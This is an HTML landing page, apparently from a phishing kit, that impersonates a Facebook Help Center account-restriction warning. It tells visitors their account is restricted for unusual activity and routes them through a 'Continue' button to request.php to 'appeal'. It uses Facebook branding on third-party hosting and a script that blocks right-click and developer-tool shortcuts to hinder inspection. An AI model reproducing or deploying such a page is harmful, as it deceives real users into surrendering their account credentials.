<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
    <title>Facebook Warning</title>
    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png">
    <link rel="stylesheet" href="appeal.css">
</head>

<body>
    <div id="container">
        <div id="box">
            <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/icon.png?v=1699082922949" alt="">
            <div id="data">
                <h4>Facebook Help Centerﾠ</h4> <img src="https://cdn.glitch.global/0e876aa8-70cf-40f1-951b-94c8002e5dcc/thumbnails%2Fbluetick.png?1699082922610" alt="">
            </div>
            <div class="line"></div>
            <div id="para">
                <p>We have detetcted an unusual activity and post to your account. <br>So, your account is restricted from some freatures,</p>
                <p>you can submit an appeal for review.</p>
                <button> <a href="request.php">Continue</a> </button>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.shiftKey || e.key === "I" || e.key === "i")) {
                e.preventDefault();
            }
        };
    </script>
</body>

</html>